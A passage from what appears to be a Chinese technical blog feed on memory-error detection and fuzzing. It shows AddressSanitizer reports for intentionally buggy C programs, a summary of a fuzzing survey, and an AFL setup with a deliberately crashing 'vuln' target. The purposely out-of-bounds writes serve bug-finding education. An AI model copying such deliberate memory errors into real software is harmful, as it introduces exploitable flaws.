class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arduino">=================================================================<br>==<span class="hljs-number">2180936</span>==ERROR: AddressSanitizer: alloc-dealloc-<span class="hljs-built_in">mismatch</span> (<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span> [] vs <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>) on <span class="hljs-number">0x60b0000000f0</span>     <span class="hljs-comment">// 1</span><br>    #<span class="hljs-number">0</span> <span class="hljs-number">0x7fa9f877cc65</span> in <span class="hljs-keyword">operator</span> <span class="hljs-built_in">delete</span>(<span class="hljs-type">void</span>*, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) ../../../../src/libsanitizer/ASAN/ASAN_new_delete.cc:<span class="hljs-number">177</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0x55d09d3fe33f</span> in main /home/chenbing/Code/test/bad_delete.cpp:<span class="hljs-number">10</span><br>    #<span class="hljs-number">2</span> <span class="hljs-number">0x7fa9f8152082</span> in __libc_start_main ../csu/libc-start.c:<span class="hljs-number">308</span><br>    #<span class="hljs-number">3</span> <span class="hljs-number">0x55d09d3fe20d</span> in _start (/home/chenbing/Code/test/bad_delete+<span class="hljs-number">0x120d</span>)<br><br><span class="hljs-number">0x60b0000000f0</span> is located <span class="hljs-number">0</span> bytes inside of <span class="hljs-number">100</span>-<span class="hljs-type">byte</span> region [<span class="hljs-number">0x60b0000000f0</span>,<span class="hljs-number">0x60b000000154</span>)       <span class="hljs-comment">// 2</span><br>allocated by thread T0 here:<br>    #<span class="hljs-number">0</span> <span class="hljs-number">0x7fa9f877b787</span> in <span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>[](<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) ../../../../src/libsanitizer/ASAN/ASAN_new_delete.cc:<span class="hljs-number">107</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0x55d09d3fe2e5</span> in main /home/chenbing/Code/test/bad_delete.cpp:<span class="hljs-number">6</span><br>    #<span class="hljs-number">2</span> <span class="hljs-number">0x7fa9f8152082</span> in __libc_start_main ../csu/libc-start.c:<span class="hljs-number">308</span><br><br>SUMMARY: AddressSanitizer: alloc-dealloc-mismatch ../../../../src/libsanitizer/ASAN/ASAN_new_delete.cc:<span class="hljs-number">177</span> in <span class="hljs-keyword">operator</span> <span class="hljs-built_in">delete</span>(<span class="hljs-type">void</span>*, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)<br>==<span class="hljs-number">2180936</span>==HINT: <span class="hljs-keyword">if</span> you don<span class="hljs-number">&#x27;</span>t care about these errors you may set ASAN_OPTIONS=alloc_dealloc_mismatch=<span class="hljs-number">0</span><br>==<span class="hljs-number">2180936</span>==ABORTING<br></code></pre></td></tr></table></figure><p>错误类型：<code>alloc-dealloc-mismatch</code>,地址为<code>0x60b0000000f0</code></p><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// sbo.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-type">int</span> stack_array[<span class="hljs-number">100</span>];<br>    stack_array[<span class="hljs-number">101</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在栈伤创建了大小为100字节的数组，但在超过其范围的地方进行写入1</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs tap">~/Code/test$ g++ sbo.c -o sbo -fsanitize=address -g<br>chenbing@GreatDB-CB:~/Code/test$ ./sbo <br>=================================================================<br>==2196928==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffc33777f24 at pc 0x562dccb592b6 bp 0x7ffc33777d40 sp 0x7ffc33777d30    1)<br>WRITE of size<span class="hljs-number"> 4 </span>at 0x7ffc33777f24 thread T0<br>    <span class="hljs-comment">#0 0x562dccb592b5 in main /home/chenbing/Code/test/sbo.c:6</span><br>    <span class="hljs-comment">#1 0x7f45bf52d082 in __libc_start_main ../csu/libc-start.c:308</span><br>    <span class="hljs-comment">#2 0x562dccb5910d in _start (/home/chenbing/Code/test/sbo+0x110d)</span><br><br>Address 0x7ffc33777f24 is located in stack of thread T0 at offset<span class="hljs-number"> 452 </span>in frame    2)<br>    <span class="hljs-comment">#0 0x562dccb591d8 in main /home/chenbing/Code/test/sbo.c:4</span><br><br>  This frame has<span class="hljs-number"> 1 </span>object(s):     3)<br>    [48, 448) &#x27;stack_array&#x27; (line 5) &lt;== Memory access at offset<span class="hljs-number"> 452 </span>overflows this variable<br>HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork  4)<br>      (longjmp and C++ exceptions *are* supported)<br>SUMMARY: AddressSanitizer: stack-buffer-overflow /home/chenbing/Code/test/sbo.c:6 in main<br>Shadow bytes around the buggy address:    5)<br>  0x1000066e6f90:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e6fa0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 f1 f1 f1 f1<br>  0x1000066e6fb0: f1 f1<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e6fc0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e6fd0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>=&gt;0x1000066e6fe0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00[f3]f3 f3 f3 f3 f3 f3 f3<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e6ff0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e7000:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e7010:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e7020:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e7030:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>Shadow byte legend (one shadow byte represents<span class="hljs-number"> 8 </span>application bytes):<br>  Addressable:           00<br>  Partially addressable:<span class="hljs-number"> 01 </span>02<span class="hljs-number"> 03 </span>04<span class="hljs-number"> 05 </span>06<span class="hljs-number"> 07 </span><br>  Heap left redzone:       fa<br>  Freed heap region:       fd<br>  Stack left redzone:      f1<br>  Stack mid redzone:       f2<br>  Stack right redzone:     f3<br>  Stack after return:      f5<br>  Stack use after scope:   f8<br>  Global redzone:          f9<br>  Global init order:       f6<br>  Poisoned by user:        f7<br>  Container overflow:      fc<br>  Array cookie:            ac<br>  Intra object redzone:    bb<br>  ASAN internal:           fe<br>  Left alloca redzone:     ca<br>  Right alloca redzone:    cb<br>  Shadow gap:              cc<br>==2196928==ABORTING<br></code></pre></td></tr></table></figure><p>非常明确的指出了是<code>stack-buffer-overflow</code><br>栈中数组可访问的范围是<code>[48, 448)</code>,但程序访问了 452 处，故故障。</p><h2 id="全局缓冲区溢出"><a href="#全局缓冲区溢出" class="headerlink" title="全局缓冲区溢出"></a>全局缓冲区溢出</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// gbo.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> global_array[<span class="hljs-number">100</span>] = &#123;<span class="hljs-number">-1</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>  global_array[<span class="hljs-number">101</span>] = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>报错如下</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs tap">=================================================================<br>==3701==ERROR: AddressSanitizer: global-buffer-overflow on address 0x55633ad321b4 at pc 0x55633ad2f216 bp 0x7ffff739eca0 sp 0x7ffff739ec90<br>WRITE of size<span class="hljs-number"> 4 </span>at 0x55633ad321b4 thread T0<br>    <span class="hljs-comment">#0 0x55633ad2f215 in main (/home/stre/Desktop/gl+0x1215)</span><br>    <span class="hljs-comment">#1 0x7f5a1ea1dfcf in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58</span><br>    <span class="hljs-comment">#2 0x7f5a1ea1e07c in __libc_start_main_impl ../csu/libc-start.c:409</span><br>    <span class="hljs-comment">#3 0x55633ad2f104 in _start (/home/stre/Desktop/gl+0x1104)</span><br><br>0x55633ad321b4 is located<span class="hljs-number"> 4 </span>bytes to the right of global variable &#x27;global_array&#x27; defined in &#x27;gl.c:4:5&#x27; (0x55633ad32020) of size 400<br>SUMMARY: AddressSanitizer: global-buffer-overflow (/home/stre/Desktop/gl+0x1215) in main<br>Shadow bytes around the buggy address:<br>  0x0aace759e3e0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e3f0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e400:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e410:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e420:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>=&gt;0x0aace759e430:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00[f9]f9 f9 f9 f9 f9<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e440: f9 f9 f9 f9 f9 f9 f9 f9<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e450:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e460:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e470:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e480:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>Shadow byte legend (one shadow byte represents<span class="hljs-number"> 8 </span>application bytes):<br>  Addressable:           00<br>  Partially addressable:<span class="hljs-number"> 01 </span>02<span class="hljs-number"> 03 </span>04<span class="hljs-number"> 05 </span>06<span class="hljs-number"> 07 </span><br>  Heap left redzone:       fa<br>  Freed heap region:       fd<br>  Stack left redzone:      f1<br>  Stack mid redzone:       f2<br>  Stack right redzone:     f3<br>  Stack after return:      f5<br>  Stack use after scope:   f8<br>  Global redzone:          f9<br>  Global init order:       f6<br>  Poisoned by user:        f7<br>  Container overflow:      fc<br>  Array cookie:            ac<br>  Intra object redzone:    bb<br>  ASan internal:           fe<br>  Left alloca redzone:     ca<br>  Right alloca redzone:    cb<br>  Shadow gap:              cc<br>==3701==ABORTING<br></code></pre></td></tr></table></figure><p>与其他溢出报错并无太大差别。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing A Survey</title>
    <link href="/2023/03/02/Fuzzing-A-Survey/"/>
    <url>/2023/03/02/Fuzzing-A-Survey/</url>
    
    <content type="html"><![CDATA[<h1 id="Fuzzing-a-survey"><a href="#Fuzzing-a-survey" class="headerlink" title="Fuzzing a survey"></a>Fuzzing a survey</h1><h2 id="1-Background"><a href="#1-Background" class="headerlink" title="1.Background"></a>1.Background</h2><ul><li>静态分析（Static analysis)：静态分析针对代码中的词汇、语义等漏洞，但缺乏正确率，即分析静态分析软件给出的信息，也需要话很多时间（高误报率）；</li><li>动态分析（Dynamic analysis)：动态分析针对运行中的程序，但效率低下，需要很大程度的人类参与，且对分析员要求很高；</li><li>符号执行（Symbolic execution)：符号执行对于大规模项目十分效率低下；</li><li>Fuzzing：可应对大规模程序，缺点是低效率与低代码覆盖率。</li></ul><h2 id="2-Fuzzing"><a href="#2-Fuzzing" class="headerlink" title="2.Fuzzing"></a>2.Fuzzing</h2><ul><li>输入文件越破碎越好，这样运行的程序更可能被打败；</li><li>输入可以是多种形式的：网络数据，各种格式的文件，可执行二进制数据等；</li></ul><p><strong>Fuzzing的执行</strong><br>Fuzzing过程中，会对发生的，感兴趣的exception，crashes，violations进行记录。随后可用各种二进制分析软件进行对crashes的分析，如<code> IDA Pro</code>,<code>GDB</code>等等。</p><ul><li>两种Fuzzer<ul><li>基于生成的fuzzer：更熟悉文件格式，能精准生成代码，更容易突破文件验证，测试更深层次的代码，当文件不友好时，分析文件格式很困难。</li><li>基于异变的fuzzer： 更简单地开始测试，需要一串有效的初始输入。</li></ul></li></ul><ul><li><p>基于依赖源码等级分类</p><ul><li>white box:需要源码，文件内的信息进行fuzz；</li><li>gray box:无需源码，通过运行分析程序获取部分内部信息；</li><li>black box:无需源码，不需要任何程序内部信息。</li></ul></li><li><p>dumb fuzzer 和 smart fuzzer：</p><ul><li>前者更注重速度，不回收信息；</li><li>后者会回收信息，优化异变策略，优化输入 。</li></ul></li></ul><p>Fuzzing目前遇到的挑战：</p><ul><li><p>The challenge of  <strong>how to mutate</strong>  seed inputs. </p><ul><li>如何变异/生成样例使其能涵盖更多路径、更容易触发bug；</li><li>何处变异，如何变异是重点；</li><li>即盲目异变是浪费时间，精准的变异策略才是解决问题的关键。</li></ul></li><li><p>The challenge of low <strong>code coverage</strong>.</p><ul><li>更高的覆盖率意味着更高的发现bug概率；</li><li>利用程序分析，达到更高的覆盖率。</li></ul></li><li><p>The challenge of <strong>passing the validation</strong>.</p><ul><li>许多程序都有输入检测，不符合规范则不予执行；</li><li>灰盒与黑盒程序对内部认证方式不清楚，很难绕过检测，于是效率低下。</li></ul></li></ul><h2 id="3-Coverage-based-Fuzzing"><a href="#3-Coverage-based-Fuzzing" class="headerlink" title="3.Coverage-based Fuzzing"></a>3.Coverage-based Fuzzing</h2><p><strong>Code coverage counting</strong></p><ul><li><p>最先进的方法把基本块（basic blocks）作为粒度</p><ul><li>基本块是程序执行时最小的相关单元；</li><li>测量函数或者指令会导致信息缺失或冗余；</li><li>BB可以用首地址辨认，且BB的信息可以轻松通过代码检测提取。</li></ul></li><li><p>两种测量选择： </p><ul><li> 仅计算运行的 BB 数量；</li><li> 以及计算 BB 间转换次数；</li></ul></li><li><p>前者测量顶点（vertices），后者测量边（edge）；  </p></li></ul><p><strong>以AFL为例，介绍边（edge）测量</strong></p><ul><li>有源码时：在编译生成二进制文件时，插入桩，为检测做准备；</li><li>无源码时：将基本块转换为 TCG 块时插桩。</li></ul><p>列举一段插桩代码</p><figure class="highlight c"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs c">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;<br>shared_mem [ cur_location ^ prec_location]++;<br>prev_location = cur_location &gt;&gt; <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>cur_location 是随机生成的 ID ，而 shared_mem 是一块 64KB 的共享内存，每一个字节都标识着一个独特的边。<br>当一个 BB 间跳转发生时，会计算一个哈希值，然后当前哈希值对应的 bitmap 中的数据会被更新。如下图</p><p><strong>Working process of coverage-based fuzzing</strong><br>主循环内，程序挑选 interesting 种子进行变异、程序生成。目标程序执行这些生成的 testcases，发生 crash 的目标程序会被收集下来，其他感兴趣的样例会被放入种子池。<br>在 <strong>覆盖率引导</strong> 的 fuzzing 内，触发了新路径的程序，会被认为是 <strong>interesting</strong></p><p>Fuzzing 过程中，我们主要关注 覆盖率 和 程序违规 。<br>前者可由之前插桩代码来统计；<br>后者可在 sanitizer 的帮助下，进行分析。</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">什么是<span class="hljs-variable">Sanitizer</span>？<br><span class="hljs-variable">Sanitizer</span>是由 <span class="hljs-variable">Google</span> 研发团队提出的用于检测 <span class="hljs-built_in">C</span><span class="hljs-operator">/</span><span class="hljs-built_in">C</span><span class="hljs-operator">++</span> 程序常见内存错误的工具集<br>其中包含：<br><span class="hljs-variable">AddressSanitizer</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">asan</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">:</span>检测内存访问错误，即发现程序访问了不该访问的内存，就会记录错误；<br><span class="hljs-variable">LeakageSanitizer</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">lsan</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">:</span>内存泄露检测；<br><span class="hljs-variable">MemorySanitizer</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">msan</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">:</span>检查读取未初始化的内存错误；<br><span class="hljs-variable">ThreadSanitizer</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">tsan</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">:</span>检测数据竞争与死锁；<br><span class="hljs-variable">UndefinedBehaviorSanitizer</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">ubsan</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">:</span>检测未定义的操作。<br></code></pre></td></tr></table></figure><p><strong>Key questions</strong></p><ul><li>How to get initial inputs ?<ul><li>提供格式良好的 inputs ；</li><li>良好的 inputs 可以适应许多格式复杂的文件 ；</li><li>能探入更深层次路径的 inputs ；</li><li>可复用</li></ul></li><li>How to generate testcases ?</li><li>How to select seed from the pool ?<ul><li>covering more code and be more likely to trigger vulnerabilities;</li><li>reduce the waste of repeatedly execution of paths and save computing resource</li></ul></li><li>How to efficiently test applications?<ul><li>forkserver </li></ul></li></ul><h2 id="4-Techniques-integrated-in-fuzzing"><a href="#4-Techniques-integrated-in-fuzzing" class="headerlink" title="4.Techniques integrated in fuzzing"></a>4.Techniques integrated in fuzzing</h2><ul><li>污点分析;</li><li>利用AI生成、检测好的seed，使之符合格式;</li><li>Intel PT;</li></ul><h2 id="5-Fuzzing-towards-different-applications"><a href="#5-Fuzzing-towards-different-applications" class="headerlink" title="5.Fuzzing towards different applications"></a>5.Fuzzing towards different applications</h2><ul><li>File format fuzzing;<ul><li>Peach;</li><li>on web browsers;</li></ul></li><li>Kernel fuzzing;</li><li>Fuzzing of protocols;</li></ul><h2 id="6-New-trends-of-fuzzing"><a href="#6-New-trends-of-fuzzing" class="headerlink" title="6.New trends of fuzzing"></a>6.New trends of fuzzing</h2><ul><li>Smart fuzzing;</li><li>New techniques;<ul><li>machine learning;</li></ul></li><li>new system features and hardware features;</li></ul><h2 id="7-Conclusion"><a href="#7-Conclusion" class="headerlink" title="7.Conclusion"></a>7.Conclusion</h2><p>Fuzzing是目前最为有效且效率高的漏洞发掘方式，本文对比了Fuzzing与其他技术的差别，总结了Fuzzing中综合的技术，最后展望了能让Fuzzing更为高效的未来技术。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing</title>
    <link href="/2023/02/19/Fuzzing/"/>
    <url>/2023/02/19/Fuzzing/</url>
    
    <content type="html"><![CDATA[<h1 id="初探Fuzz"><a href="#初探Fuzz" class="headerlink" title="初探Fuzz"></a>初探Fuzz</h1><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>官网下载<br><a href="https://lcamtuf.coredump.cx/afl/">https://lcamtuf.coredump.cx/afl/</a><br>然后安装<br><code>tar zxvf afl-2.52b.tgz</code><br><code>make</code><br><code>sudo make install</code><br>安装结束</p><h3 id="初步使用AFL"><a href="#初步使用AFL" class="headerlink" title="初步使用AFL"></a>初步使用AFL</h3><p>样例程序（靶）</p><figure class="highlight cpp"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span> </span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vuln</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(str);<br>    <span class="hljs-keyword">if</span>(str[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="hljs-number">66</span>)<br>    &#123;<br>        <span class="hljs-built_in">raise</span>(SIGSEGV);<br>        <span class="hljs-comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(str[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="hljs-number">6</span>)<br>    &#123;<br>        <span class="hljs-built_in">raise</span>(SIGSEGV);<br>        <span class="hljs-comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span 